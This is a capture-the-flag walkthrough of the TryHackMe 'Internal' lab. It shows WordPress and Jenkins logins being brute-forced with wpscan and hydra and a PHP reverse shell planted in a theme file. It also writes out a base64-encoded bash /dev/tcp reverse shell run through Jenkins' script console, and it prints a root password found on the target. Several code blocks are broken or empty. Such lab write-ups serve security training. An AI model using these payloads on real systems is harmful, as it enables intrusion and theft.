Internal is a free Try Hack Me box that tries to emulate an internal penetration test. 

The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).

This one is a bit of a bender so let's do it.

***

# Nmap Scan & Enumeration
Adding the IP to our /etc/hosts file to resolve the DNS to internal.thm locally. 
```bash
â”Œâ”€â”€(rootðŸ’€redfish)-[/home/raindayzz/TryHackMe/Internal2]
â””â”€# cat /etc/hosts                                                                                                                                                                                                                      130 â¨¯
127.0.0.1	localhost
127.0.1.1	redfish

internal.thm	10.10.56.197 


# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes

```
### Nmap Scan
```bash

### Port 80 (HTTP)

Let's start with looking into port 80. It seems to be a default linux apache2 server page. Let's start some directory busting to see if we can find something. 
```â”Œâ”€â”€(raindayzzã‰¿redfish)-[~/TryHackMe/Internal2]
â””â”€$ gobuster dir -u http://internal.thm  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt -o gb80.txt

Boom! Wordpress is huge and is a notablely vulnerable CMS. Let's use WPScan, a popular wordpress vulnerability scanner to see what the configurations & plugins look like. 

```bash
â”Œâ”€â”€(raindayzzã‰¿redfish)-[~/TryHackMe/Internal2]
â””â”€$ wpscan --url http://internal.thm/blog --enumerate u                                                          4 â¨¯

### Cracking the Admin password
We see that WPScan gave us a user named admin and that XML-RPC seems to be enabled which will allow us to bruteforce some passwords. Let's see if we can crack the admin password. 

```bash
â”Œâ”€â”€(raindayzzã‰¿redfish)-[~/TryHackMe/Internal2]

After a quick cup of coffee, we get some credentials to the admin password. Let's login and see what trouble we can create.

# Remote Code Execution


![Pasted image 20210817181941.png](/assets/images/internal/wpadmin.png)

Let's see if we can exploit a pretty generic thing in the editor page to overwrite PHP code. Here is a pretty basic example on how to do so.  https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress

We will edit the 404.php under the wordpress theme here is a photo of the code before and we will inject our PHP reverse shell in the second picture.



![Pasted image 20210817183343.png](/assets/images/internal/before.png)



![Pasted image 20210817183412.png](/assets/images/internal/after.png)

Once we update the code, we will start a listener on our kali machine and curl the 404.php page and hopefully it executes our PHP code and we get a reverse shell. 


![Pasted image 20210817183648.png](/assets/images/internal/shell1.png)

Boom!

Okay, let's do some port forwarding. This can be a bit confusing but we are going to re-direct the traffic from the localhost over a port back to my attacker box.

Okay now if we visit our localhost on port 7000 we will be served the page that is being served on 8080 on our target, crazy right?

After some deafult creds were tried, let's see if we can brute force it with hydra.. I fired up Burp Suite Proxy and tweaked the POST request.

```bash
â”Œâ”€â”€(raindayzzã‰¿redfish)-[~/TryHackMe/Internal2]
â””â”€$ hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 7000 http-post-form "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"

I was able to crack the admin password with hydra, rookie stuff.

Now that I am in. I'm going to try to grab a reverse shell with the /script and a common reverse shell injection command from HackTrickxyz

Here is a code snippit to use from hacktricks ( https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins) 

```jenkins
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

The echo command is base 64 encrypted, let's decrypt it and change it.

```bash
â”€â”€(raindayzzã‰¿redfish)-[~/TryHackMe/Internal2]
â””â”€$ echo -n "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==" | base64 -d
bash -c 'bash -i >& /dev/tcp/10.10.14.22/4343 0>&1'
```

Okay cool, let's change the IP & port to match our kali system and re-encrypt it. 

```bash
â”Œâ”€â”€(raindayzzã‰¿redfish)-[~/TryHackMe/Internal2]
â””â”€$ echo -n "bash -c 'bash -i >& /dev/tcp/10.9.11.106/135 0>&1'" | base64                                              1 â¨¯
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjExLjEwNi8xMzUgMD4mMSc=
```

Book past it into our Jenkins /Script directory and let's get a shell.

```bash
â”Œâ”€â”€(raindayzzã‰¿redfish)-[~/TryHackMe/Internal2]
â””â”€$ sudo nc -lnvp 135                                                                       1 â¨¯

jenkins@jenkins:/$ uname -a

```

Okay, we are not root like we expected. I am now in a Docker instance hence the uname command and jenkins user. Let's do some basic enumeration... 

In the opt directory we find a file called note.txt and it seems to supply us with plaintext credentials to root
```bash
jenkins@jenkins:/$ cd /opt
cd /opt
jenkins@jenkins:/opt$ ls -l
ls -l
total 4
-rw-r--r-- 1 root root 204 Aug  3  2020 note.txt
jenkins@jenkins:/opt$ cat note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
jenkins@jenkins:/opt$
```

Okay! Sweet we have root (at least we think, let's try it out)
```bash
aubreanna@internal:~$ whoami
aubreanna
aubreanna@internal:~$ uname -a
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
aubreanna@internal:~$ su root
Password: 
root@internal:/home/aubreanna# whoami
root
root@internal:/home/aubreanna# cat /root/root.txt | head -c 5
THM{d
root@internal:/home/aubreanna# 
```

Nice! We own the system and have root privs. Done!
